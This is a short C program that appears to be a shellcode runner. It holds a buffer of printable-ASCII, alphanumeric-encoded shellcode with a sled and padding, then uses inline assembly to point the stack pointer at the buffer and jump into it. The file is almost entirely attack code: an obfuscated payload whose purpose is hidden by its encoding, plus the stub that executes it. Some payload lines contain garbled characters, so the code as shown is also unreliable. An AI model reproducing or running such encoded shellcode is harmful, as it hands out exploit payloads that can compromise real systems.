#include <stdio.h>

int main()
{
     char buffer[400]="aaaaaaaaj0X40HPZRXf5A9f5UVfPh0z00X5JEaBP�
                      �YAAAAAAQhC000X5C7wvH4wPh00a0X527MqPh0�
                      �0CCXf54wfPRXf5zzf5EefPh00M0X508aqH4uPh0G0�
                      �0X50ZgnH48PRX5000050M00PYAQX4aHHfPRX40�
                      �46PRXf50zf50bPYAAAAAAfQRXf50zf50oPYAAAfQ�
                      �RX5555z5ZZZnPAAAAAAAAAAAAAAAAAAAAAAA�
                      �AAAAAAAAAAAAAAAAAAAAAAAAEBEBEBEBEBE�
                      �BEBEBEBEBEBEBEBEBEBEBEBEBEBEBQQ";
     unsigned int x = 0;
     x = &buffer;
     __asm{

mov esp,x
             jmp esp
             }
     return 0;
}
